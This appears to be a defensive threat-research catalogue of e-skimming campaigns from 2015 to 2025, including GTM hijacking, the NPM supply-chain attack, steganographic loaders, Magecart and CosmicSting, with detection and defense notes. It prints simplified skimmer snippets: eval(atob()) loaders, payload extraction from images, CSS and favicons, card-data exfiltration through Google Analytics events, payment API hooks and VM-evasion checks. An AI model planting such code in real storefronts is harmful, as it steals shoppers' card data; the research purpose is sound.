# Major E-Skimming Attack Types & Published Code
**Last Updated:** 2025-10-21 | **Version:** 2.0

This document catalogs major e-skimming attack types, techniques, and published code examples from 2015 to 2025. It serves as the primary research data source for the MITRE ATT&CK matrix and interactive threat model.

## Table of Contents
1. [2024-2025 Emerging Threats](#2024-2025-emerging-threats)
2. [Magecart (Multiple Groups)](#1-magecart-multiple-groups)
3. [WooCommerce-Specific Skimmers](#2-woocommerce-specific-skimmers)
4. [Inter/SnifFall Skimmer Kit](#3-intersniffall-skimmer-kit)
5. [Kritec Skimmer](#4-kritec-skimmer)
6. [CosmicSting Vulnerability](#5-cosmicsting-vulnerability-exploitation-cve-2024-34102)
7. [Detection & Analysis Tools](#6-detection--analysis-tools)
8. [Advanced Evasion Techniques](#7-advanced-evasion-techniques)
9. [Notable Real-World Attacks](#notable-real-world-attacks-with-technical-details)

---

# 2024-2025 Emerging Threats

## 8. Google Tag Manager Hijacking (2025)
**Status:** 🔴 Active threat - February 2025 campaign documented by Sucuri

**Overview:** Attackers are increasingly targeting Google Tag Manager (GTM) containers as a persistence mechanism. By compromising GTM admin credentials, threat actors can inject Base64-encoded skimmers that bypass traditional security controls.

**Why GTM?**
- GTM loads on every page of an e-commerce site
- Security tools often whitelist GTM and skip container scanning
- Changes to GTM containers don't trigger file integrity monitoring
- Average persistence: **3.5 months** before detection

**2025 Campaign Details:**
- **Scope:** 316 e-commerce stores compromised
- **Victims:** Approximately 88,000 payment cards stolen
- **IOC:** GTM identifier `GTM-MLHK2N68` (confirmed malicious)
- **Backdoor:** `media/index.php` for re-infection capability
- **Storage:** Magento DB table `cms_block.content`

**Attack Chain:**
```
1. Initial Access: Phishing GTM admin credentials (T1078)
2. Persistence: Inject malicious tag in GTM container (CUSTOM)
3. Obfuscation: Base64-encoded skimmer resembling legitimate GTM/GA code (T1027)
4. Defense Evasion: Security tools whitelist GTM (T1036 - Masquerading)
5. Collection: Form interception on checkout pages (T1056.002)
6. Exfiltration: POST to attacker-controlled domains (T1041)
```

**Example Malicious GTM Tag Pattern:**
```javascript
// Obfuscated Base64 payload in GTM custom HTML tag
<script>
eval(atob('...Base64-encoded skimmer...'));
// Resembles legitimate GTM dataLayer pushes
</script>
```

**Detection:**
- Audit all GTM containers for unauthorized tags
- Monitor for Base64-encoded content within GTM tags
- Network monitoring for non-Google domains in GTM context
- File integrity monitoring on `media/index.php`
- Database monitoring on `cms_block.content` table

**Defense:**
- Multi-factor authentication (MFA) for GTM admin accounts
- Tag approval workflows requiring code review
- Automated GTM container scanning for Base64 patterns
- Restrict GTM container editing to authorized IP addresses
- Regular audits of GTM tag history

**Sources:**
- Sucuri Blog: "Magecart Attacks Continue to Evolve" (February 2025)
- Sansec Threat Intelligence: GTM-MLHK2N68 IOC database

---

## 9. NPM Supply Chain Attack (September 2025)
**Status:** 🔴 Observed in wild - September 8, 2025 incident

**Overview:** The most significant NPM supply chain attack to date, compromising 20 popular packages with a combined **2 billion weekly downloads**. Demonstrates sophisticated phishing + MITM 2FA theft.

**Attack Vector:**
1. **Target:** Josh Junon (GitHub: Qix), maintainer of core NPM packages
2. **Method:** Phishing email + Man-in-the-Middle attack on 2FA
3. **Compromise:** Full account takeover despite 2FA enabled
4. **Duration:** 2.5 hours exposure (September 8, 2025)

**Compromised Packages:**
- `chalk` (140M weekly downloads) - Terminal color library
- `debug` (75M weekly downloads) - Debugging utility
- `ansi-styles` (60M weekly downloads) - ANSI styling
- `supports-color` (55M weekly downloads) - Color detection
- `strip-ansi` (50M weekly downloads) - Strip ANSI codes
- **+15 additional packages** in the dependency chain

**Payload Analysis:**
- **Target:** Crypto wallet hijacking (not traditional e-skimming)
- **Scope:** ETH, BTC, SOL, TRX, LTC, BCH wallets
- **Context:** Web applications (targets browser environments)
- **Technique:** API hooking for wallet libraries
- **Persistence:** Post-install scripts

**Code Pattern:**
```javascript
// Simplified malicious post-install script
{
  "scripts": {
    "postinstall": "node scripts/install.js"
  }
}

// install.js - Hooks crypto wallet APIs
if (typeof window !== 'undefined') {
  // Browser context - hook wallet libraries
  window.ethereum = new Proxy(window.ethereum, { ... });
}
```

**Impact on E-Commerce:**
- Any e-commerce platform using affected packages
- Build-time code injection
- Difficult to detect at runtime
- Affects both client and server-side builds

**Detection:**
- Monitor `package.json` and `package-lock.json` changes
- Audit post-install scripts in dependencies
- Use `npm audit` and security tools (Snyk, Socket Security)
- Subresource Integrity (SRI) for client-side bundles
- Dependency pinning with exact versions

**Defense:**
- **Hardware 2FA keys** (FIDO2/WebAuthn) - resistant to MITM
- Package version locking (`npm ci` instead of `npm install`)
- Automated dependency scanning in CI/CD
- Private NPM registry with approval workflow
- Regular security audits of dependency tree

**Related:** Shai-Hulud Worm (September 14, 2025) - Self-replicating NPM worm discovered days later

**Sources:**
- NPM Security Advisory (September 2025)
- GitHub Security Blog: "Account Compromise Analysis"
- Socket Security: "2025 Supply Chain Report"

---

## 10. Steganography Techniques (2020-2025)
**Status:** 🔴 Mainstream adoption - Multiple campaigns documented

**Overview:** Hiding malicious skimmer code in image metadata, CSS files, and favicons has evolved from exotic to mainstream. Bypasses traditional file scanning and WAF rules.

### A. Image EXIF Metadata (JPEG)
**Technique:** Embed JavaScript code in JPEG EXIF "Copyright" field

**Real-World Example - Segway (2022):**
- **Scope:** ~600,000 visitors exposed
- **Method:** Malicious code in product image EXIF data
- **Extraction:** JavaScript reads EXIF, evaluates code
- **Evasion:** Bypasses Content Security Policy (CSP)

**Code Pattern:**
```javascript
// Attacker embeds skimmer in EXIF Copyright field
// Legitimate-looking product image with hidden payload

// Extraction code on compromised site:
fetch('/images/product.jpg')
  .then(r => r.arrayBuffer())
  .then(buffer => {
    const exif = parseEXIF(buffer);
    eval(exif.Copyright); // Execute hidden skimmer
  });
```

**Detection:**
- EXIF metadata scanning (ExifTool)
- Unusual Copyright field patterns
- JavaScript files accessing image EXIF data
- Network requests after EXIF parsing

### B. CSS File Steganography
**Technique:** Hide Base64-encoded skimmer in CSS comments

**Pattern:**
```css
/* Legitimate CSS */
.button { color: blue; }

/*! __ENCODED__:ZnVuY3Rpb24gKCkge3ZhciBjYXJkRGF0YSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjYXJkIikudmFsdWU7Li4ufQ== */

/* More legitimate CSS */
```

```javascript
// Extraction code:
fetch('/assets/styles.css')
  .then(r => r.text())
  .then(css => {
    const match = css.match(/__ENCODED__:([A-Za-z0-9+/=]+)/);
    if (match) eval(atob(match[1]));
  });
```

**Status:** Observed in wild (2020-2023 campaigns)

### C. PNG LSB (Least Significant Bit) Steganography
**Technique:** Encode skimmer in PNG image pixels using LSB

**Capacity:** ~1KB for typical product image
**Detection Difficulty:** Very high (requires statistical analysis)

**Examples:**
- DNSChanger malware (2007, adapted 2020s)
- Stegano malvertising campaign

### D. Favicon ICO Alpha Channel (2024 Academic Research)
**Technique:** Self-decompressing JavaScript in ICO transparency layer

**Research:** arXiv paper "FAVICON TROJANS" (2024)
**Capacity:** 512 bytes uncompressed, ~800 bytes compressed (64×64 ICO)
**Status:** Theoretical/Lab-only (no observed wild usage yet)

**Code Pattern:**
```javascript
// Extraction from favicon alpha channel:
const ico = await fetch('/favicon.ico').then(r => r.arrayBuffer());
const alphaData = extractAlphaChannel(ico);
const compressed = alphaData.map(a => String.fromCharCode(a)).join('');
const skimmer = LZString.decompress(compressed);
eval(skimmer);
```

**Defense Against Steganography:**
- EXIF metadata removal on uploaded images
- CSS entropy analysis (detect high randomness in comments)
- Image upload scanning with stego detection tools
- Automated favicon validation
- Content Security Policy (CSP) with strict `script-src`

**Sources:**
- Microsoft Security Blog (2022): "Beneath the surface: Uncovering the shift in web skimming"
- Source Defense: "All About eSkimming Attacks"
- arXiv (2024): "FAVICON TROJANS: Exploiting Browser Icon Handling"

---

## 11. CSP Bypass via Google Analytics (2024)
**Status:** 🔴 Active - March 2024 Magecart campaign

**Overview:** Attackers discovered they can exfiltrate stolen payment data through legitimate Google Analytics endpoints, bypassing Content Security Policy (CSP) restrictions that normally block unauthorized network requests.

**Why It Works:**
- CSP policies typically whitelist Google Analytics (`*.google-analytics.com`)
- GA accepts arbitrary event data
- Attackers use their own GA measurement ID
- Data appears in attacker's GA dashboard

**Attack Flow:**
```javascript
// Skimmer collects card data
const cardData = {
  number: form.querySelector('#card-number').value,
  cvv: form.querySelector('#cvv').value,
  expiry: form.querySelector('#expiry').value
};

// Encode and send via Google Analytics
const encoded = btoa(JSON.stringify(cardData));
gtag('event', 'checkout', {
  'event_category': 'payment',
  'event_label': encoded,
  'non_interaction': true
});
// Data sent to attacker's GA property (G-XXXXXXXXXX)
```

**Campaign Details:**
- **Timeline:** March 2024 (Sansec/PerimeterX research)
- **Scope:** Several dozen e-commerce sites
- **Evasion:** Renders CSP ineffective for exfiltration blocking

**Detection:**
- Validate GA measurement IDs match legitimate property
- Monitor for unusual GA event patterns
- Check for Base64-encoded event labels/categories
- Network analysis for GA traffic volume spikes

**Defense:**
- Restrict CSP to specific GA measurement ID: `script-src 'unsafe-inline' https://www.google-analytics.com/g/collect?id=G-YOURID`
- Monitor GA Real-Time reports for unexpected events
- Implement GA tag approval workflow
- Use Google Tag Manager with restricted permissions

**Sources:**
- Sansec Blog: "Magecart Abuses Google Analytics for Data Theft" (March 2024)
- PerimeterX: "CSP Bypass Techniques in E-Commerce"

---

## 12. Payment Request API Manipulation (2025)
**Status:** 🔴 Observed - 2025 Stripe API abuse campaign

**Overview:** Attackers are hooking browser Payment Request API and Stripe.js to intercept payment data before encryption.

**Technique:**
```javascript
// Hook Payment Request API constructor
const OriginalPaymentRequest = window.PaymentRequest;
window.PaymentRequest = function(...args) {
  const pr = new OriginalPaymentRequest(...args);

  // Intercept show() method
  const originalShow = pr.show.bind(pr);
  pr.show = async function() {
    const response = await originalShow();
    // Steal payment data from response
    exfiltrate(response.details);
    return response;
  };

  return pr;
};

// Hook Stripe.js
if (window.Stripe) {
  const OriginalStripe = window.Stripe;
  window.Stripe = function(apiKey) {
    const stripe = OriginalStripe(apiKey);
    // Hook createPaymentMethod, confirmCardPayment, etc.
    return new Proxy(stripe, { ... });
  };
}
```

**Defense:**
- API integrity monitoring (detect prototype modifications)
- Freeze critical API objects: `Object.freeze(PaymentRequest.prototype)`
- Subresource Integrity (SRI) for payment libraries
- Early script loading order (load payment libs first)

---

## 13. WebGL VM Detection (Advanced Evasion)
**Status:** 🔴 Documented in wild

**Technique:** Query WebGL renderer to detect analysis VMs

```javascript
const canvas = document.createElement('canvas');
const gl = canvas.getContext('webgl');
const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

// Skip execution if VM detected
if (renderer.includes('swiftshader') ||
    renderer.includes('llvmpipe') ||
    renderer.includes('virtualbox') ||
    renderer.includes('vmware')) {
  return; // Don't execute skimmer in analysis environment
}
```

**Sources:**
- Wikipedia: "Web skimming" article
- Research.md (original document)

---

## 1. Magecart (Multiple Groups)
Overview: The most well-documented e-skimming operation, consisting of at least 13 different hacker groups that have been active since 2015.
Published Code Examples:

Sophisticated CC Skimming Malware (GitHub Gist): A detailed example showing a skimmer that uses localStorage to scrape data from multiple payment forms, supporting various payment processors (Stripe, Adyen, Pin Payments, etc.) Sophisticated CC skimming malware · GitHub
Santander Security Research Detection Repository: Contains Semgrep rules for detecting Magecart patterns plus two actual Magecart samples (obfuscated and reverse-engineered versions) for testing GitHub - Santandersecurityresearch/e-Skimming-Detection: Semgrep Rules for Detecting Magecart Skimmers and Obfuscated JavaScript

Key Technical Details:

British Airways Attack (2018): Used just 22 lines of JavaScript that listened to mouseup and touchend events, serialized credit card data, and sent it as JSON to an attacker-controlled server (baways.com) Inside the Breach of British Airways: How 22 Lines of Code Claimed 380,000 Victims. How We Used Machine Learning to Pinpoint the Magecart Crime Syndicate. | by Dan Schoenbaum | Medium
The British Airways skimmer modified the Modernizr JavaScript library version 2.6.2, loading from the baggage claim information page The Code Behind Magecart Skimming Scripts - RapidSpike

Attack Variations:

Google Tag Manager Disguise: Skimmers inject inline scripts resembling Google Tag Manager snippets, using Base64 encoding to obfuscate URLs and using WebSockets for command and control Magecart Attack Disguised as Google Tag Manager | Akamai
404 Error Page Manipulation: Attackers manipulate default 404 error pages to hide and load card-stealing code The Art of Concealment: A New Magecart Campaign That’s Abusing 404 Pages | Akamai
Image File Obfuscation: Malicious skimming scripts encoded in PHP and embedded inside image files, masquerading as Google Analytics or Meta Pixel scripts Beneath the surface: Uncovering the shift in web skimming | Microsoft Security Blog

2. WooCommerce-Specific Skimmers
Three distinct skimmers targeting WooCommerce WordPress plugin were discovered: New Card Skimmer Attacks Detected Ahead of Christmas Shopping Season - IEMLabs Blog
a) WooTheme Skimmer

Simple and easy to use
Code typically obfuscated to avoid detection
Found in five domains using hacked WooCommerce themes

b) Slect Skimmer

Named after a misspelling of "select" that helped researchers discover it
Believed to be a variation of the Grelos skimmer
Exploits spelling typo to avoid detection

c) Gateway Skimmer

Uses multiple layers and steps to obfuscate processes and avoid detection, with huge obfuscated code that's difficult to decipher New Card Skimmer Attacks Detected Ahead of Christmas Shopping Season - IEMLabs Blog
Checks for Firebug web browser extension presence New Card Skimmer Attacks Detected Ahead of Christmas Shopping Season - IEMLabs Blog

3. Inter/SnifFall Skimmer Kit
Commercial skimmer kit developed by an actor known as "Sochi" (previously "poter"), first released as SnifFall in 2016 for $5,000, then updated as Inter in 2018 for $1,300 with a 30/70 profit-sharing option Computer WeeklyInfosecurity Magazine
Features:

Dashboard to generate and deploy skimming code with back-end storage for skimmed payment data Credit Card Skimmer Hits Over 1500 Websites - Infosecurity Magazine
Copies data from form fields tagged as "input", "select", or "textarea", converts to JSON and base64 encodes it Credit Card Skimmer Hits Over 1500 Websites - Infosecurity Magazine
Modern versions integrate obfuscation services via API, create fake payment forms for PayPal, and automatically check for duplicate data using MD5 and cookies One actor behind Magecart skimmer kit | Computer Weekly
Affected around 1,500 sites since late 2018

4. Kritec Skimmer
Discovered in 2023, uses an interesting loading method where injected code calls a first domain and generates a Base64 response that reveals a URL pointing to heavily obfuscated skimming code New Kritec Magecart skimmer found on Magento stores
Technical Details:

Data exfiltration done via both WebSocket and POST requests New Kritec Magecart skimmer found on Magento stores
Often found alongside other skimmers on the same compromised sites

5. CosmicSting Vulnerability Exploitation (CVE-2024-34102)
Critical XXE vulnerability in Adobe Commerce/Magento versions 2.4.6 and earlier with a CVSS score of 9.8, allowing attackers to exploit XML External Entities during deserialization for remote code execution SplunkGitHub
Published Exploit Code:

GitHub repository by jakabakos contains full exploit implementation with local and remote server options GitHub - jakabakos/CVE-2024-34102-CosmicSting-XXE-in-Adobe-Commerce-and-Magento: CosmicSting: critical unauthenticated XXE vulnerability in Adobe Commerce and Magento (CVE-2024-34102)
Detailed technical write-up on spacewasp/public_docs explains the vulnerability mechanism and includes proof-of-concept code public_docs/CVE-2024-34102.md at main · spacewasp/public_docs

Impact:

Drove a threefold increase in Magecart infections in 2024, reaching nearly 11,000 unique e-commerce domains, alongside use of out-of-the-box kits like "Sniffer by Fleras" e-Skimming-Detection/README.md at main · Santandersecurityresearch/e-Skimming-Detection

6. Detection & Analysis Tools
Santander Security Research Repository:
Provides Semgrep rules detecting obfuscated JavaScript, credit card extraction patterns, data exfiltration techniques, anti-debugging checks, and localStorage abuse GitHub - Santandersecurityresearch/e-Skimming-Detection: Semgrep Rules for Detecting Magecart Skimmers and Obfuscated JavaScript
Key Detection Patterns:

Dynamic code execution (eval, Function)
Data exfiltration (fetch, WebSocket, covert channels)
Storage abuse (localStorage, sessionStorage)
DevTools/debugger detection

7. Advanced Evasion Techniques
Skimmers employ sophisticated evasion including: The Code Behind Magecart Skimming Scripts - RapidSpike

Geofencing: Only serving malicious code to specific countries
Browser Detection: Targeting non-IE browsers or avoiding security researchers
Device Type Filtering: Only displaying skimmers on mobile devices
OS Detection: Hiding from Linux users (likely security professionals)
WebGL API checks to detect virtual machines used by security researchers (checking for "swiftshader", "llvmpipe", or "virtualbox" renderers) Web skimming - Wikipedia

Academic & Industry Research

Palo Alto Networks Unit 42: Detailed anatomy of formjacking attacks with deobfuscation examples and anti-debug code analysis Anatomy of Formjacking Attacks Anatomy of Formjacking Attacks
Journal of Financial Crime (2020): "Formjacking attack: Are we safe?" - Academic paper on attack modus operandi and machine learning defense mechanisms IDEAS/RePEcResearchGate
Source Defense: Comprehensive overview including favicon EXIF data hiding, JPEG file data hiding, and randomization techniques All About eSkimming Attacks - Source Defense

Notable Real-World Attacks with Technical Details

British Airways (2018) - 380,000 victims, 22-line JavaScript skimmer
Ticketmaster (2018) - 40,000 victims via compromised Inbenta chatbot
Newegg (2018) - Skimmer placed directly in source code
European Space Agency (2024) - Recent Magecart attack on official store
Segway (2022) - Malicious code embedded in images, ~600,000 visitors exposed



